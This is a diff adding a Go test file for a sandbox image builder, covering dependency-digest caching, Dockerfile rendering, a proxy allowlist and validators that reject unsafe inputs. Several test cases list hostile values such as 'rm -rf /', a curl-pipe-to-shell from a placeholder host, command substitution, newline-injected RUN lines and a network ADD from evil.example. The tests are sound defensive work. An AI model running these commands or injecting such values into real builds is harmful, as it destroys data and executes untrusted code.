@@ -1,0 +1,184 @@
+package imagespec_test
+
+import (
+	"errors"
+	"strings"
+	"testing"
+
+	"github.com/skael-dev/skael/internal/eval/sandbox"
+	"github.com/skael-dev/skael/internal/eval/sandbox/imagespec"
+	"github.com/skael-dev/skael/internal/eval/spec"
+)
+
+func env(mut ...func(*sandbox.EnvSpec)) sandbox.EnvSpec {
+	e := sandbox.EnvSpec{
+		Skill:   "demo",
+		BaseTag: imagespec.DefaultBaseTag,
+		Deps:    spec.DepsDecl{Pip: []string{"pandas==2.2.0", "numpy"}, Apt: []string{"poppler-utils"}},
+	}
+	for _, f := range mut {
+		f(&e)
+	}
+	return e
+}
+
+func TestDepsDigest_IsOrderIndependent(t *testing.T) {
+	a, err := imagespec.DepsDigest(env())
+	if err != nil {
+		t.Fatal(err)
+	}
+	b, err := imagespec.DepsDigest(env(func(e *sandbox.EnvSpec) {
+		e.Deps.Pip = []string{"numpy", "pandas==2.2.0"}
+	}))
+	if err != nil {
+		t.Fatal(err)
+	}
+	// The digest is a cache key. If declaration order changes it, every
+	// regenerated spec rebuilds every layer for no reason.
+	if a != b {
+		t.Errorf("digest changed with dep order: %s vs %s", a, b)
+	}
+}
+
+func TestDepsDigest_ChangesWithTheBaseTag(t *testing.T) {
+	a, err := imagespec.DepsDigest(env())
+	if err != nil {
+		t.Fatal(err)
+	}
+	b, err := imagespec.DepsDigest(env(func(e *sandbox.EnvSpec) { e.BaseTag = "whetstone-base:2" }))
+	if err != nil {
+		t.Fatal(err)
+	}
+	// A layer is only equivalent over the same base. Ignoring the base tag
+	// serves a stale layer built on an image that no longer exists, and the
+	// resulting run failures look like skill failures.
+	if a == b {
+		t.Error("digest ignored the base tag; a rebuilt base would serve a stale layer")
+	}
+}
+
+func TestDepsDigest_ChangesWithTheFragment(t *testing.T) {
+	a, _ := imagespec.DepsDigest(env())
+	b, err := imagespec.DepsDigest(env(func(e *sandbox.EnvSpec) { e.EnvFrag = "ENV TZ=UTC" }))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if a == b {
+		t.Error("digest ignored EnvFrag")
+	}
+}
+
+func TestValidateDeps_RejectsShellMetacharacters(t *testing.T) {
+	// Deps come from a model-authored spec and land in a RUN instruction. This
+	// is the difference between a dependency list and arbitrary code execution
+	// during an image build.
+	for _, dep := range []string{
+		"pandas; rm -rf /",
+		"pandas && curl https://x | sh",
+		"$(whoami)",
+		"`id`",
+		"pandas\nRUN echo pwned",
+		"--index-url=https://evil.example/simple",
+		"../../etc/passwd",
+		"",
+	} {
+		d := spec.DepsDecl{Pip: []string{dep}}
+		if err := imagespec.ValidateDeps(d); !errors.Is(err, imagespec.ErrUnsafeDep) {
+			t.Errorf("ValidateDeps(%q) = %v, want ErrUnsafeDep", dep, err)
+		}
+	}
+}
+
+func TestValidateDeps_AcceptsOrdinaryPackages(t *testing.T) {
+	d := spec.DepsDecl{
+		Apt: []string{"poppler-utils", "libreoffice-calc"},
+		Pip: []string{"pandas==2.2.0", "python-docx", "ruamel.yaml"},
+		Npm: []string{"prettier", "@anthropic-ai/claude-code@2.1.220"},
+	}
+	if err := imagespec.ValidateDeps(d); err != nil {
+		t.Errorf("ValidateDeps rejected ordinary packages: %v", err)
+	}
+}
+
+func TestValidateFragment_RejectsEscapingInstructions(t *testing.T) {
+	for _, frag := range []string{
+		"FROM alpine",                         // escapes the pinned base
+		"ADD https://evil.example/x.sh /x.sh", // fetches from the network at build time
+		"RUN --mount=type=secret,id=k cat /run/secrets/k",
+		"ONBUILD RUN echo x",
+		"VOLUME /",
+	} {
+		if err := imagespec.ValidateFragment(frag); !errors.Is(err, imagespec.ErrUnsafeFragment) {
+			t.Errorf("ValidateFragment(%q) = %v, want ErrUnsafeFragment", frag, err)
+		}
+	}
+}
+
+func TestValidateFragment_AcceptsTheSafelist(t *testing.T) {
+	frag := "ENV TZ=UTC\nWORKDIR /workspace\nRUN mkdir -p /opt/fixtures\nCOPY environment/ /opt/fixtures/\n"
+	if err := imagespec.ValidateFragment(frag); err != nil {
+		t.Errorf("ValidateFragment rejected the safelist: %v", err)
+	}
+	if err := imagespec.ValidateFragment(""); err != nil {
+		t.Errorf("ValidateFragment rejected an empty fragment: %v", err)
+	}
+}
+
+func TestRender_LayersOverTheBaseAndValidatesFirst(t *testing.T) {
+	got, err := imagespec.Render(env())
+	if err != nil {
+		t.Fatalf("Render: %v", err)
+	}
+	if !strings.HasPrefix(got, "FROM "+imagespec.DefaultBaseTag+"\n") {
+		t.Errorf("Render did not start FROM the base tag:\n%s", got)
+	}
+	if !strings.Contains(got, "pandas==2.2.0") || !strings.Contains(got, "poppler-utils") {
+		t.Errorf("Render dropped a dep:\n%s", got)
+	}
+
+	_, err = imagespec.Render(env(func(e *sandbox.EnvSpec) {
+		e.Deps.Pip = []string{"pandas; rm -rf /"}
+	}))
+	if !errors.Is(err, imagespec.ErrUnsafeDep) {
+		t.Errorf("Render err = %v, want it to validate before emitting", err)
+	}
+}
+
+func TestBaseDockerfile_SlimDropsTheHeavyTools(t *testing.T) {
+	full := imagespec.BaseDockerfile(false)
+	slim := imagespec.BaseDockerfile(true)
+	if !strings.Contains(full, "libreoffice") {
+		t.Error("the full base image lost LibreOffice; document skills need it")
+	}
+	// The slim image is what makes the docker-tagged tests gate CI in a few
+	// minutes instead of twenty.
+	if strings.Contains(slim, "libreoffice") || strings.Contains(slim, "ffmpeg") {
+		t.Error("the slim base image carries the heavy tools; the CI job will time out")
+	}
+	for _, want := range []string{"python3", "nodejs", "jq", "tinyproxy"} {
+		if !strings.Contains(slim, want) {
+			t.Errorf("the slim base image is missing %s, which the sandbox tests need", want)
+		}
+	}
+}
+
+func TestProxyConfig_EmitsOneFilterEntryPerDomain(t *testing.T) {
+	cfg, err := imagespec.ProxyConfig([]string{"api.anthropic.com", "statsig.anthropic.com"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, want := range []string{"api.anthropic.com", "statsig.anthropic.com", "FilterDefaultDeny Yes"} {
+		if !strings.Contains(cfg, want) {
+			t.Errorf("config missing %q:\n%s", want, cfg)
+		}
+	}
+
+	// A domain carrying config syntax would otherwise rewrite the proxy's own
+	// rules — the allowlist is the enforcement point, so it validates its input.
+	if _, err := imagespec.ProxyConfig([]string{"x\nFilterDefaultDeny No"}); err == nil {
+		t.Error("ProxyConfig accepted a domain containing a newline")
+	}
+	if _, err := imagespec.ProxyConfig(nil); err == nil {
+		t.Error("ProxyConfig accepted an empty allowlist")
+	}
+}
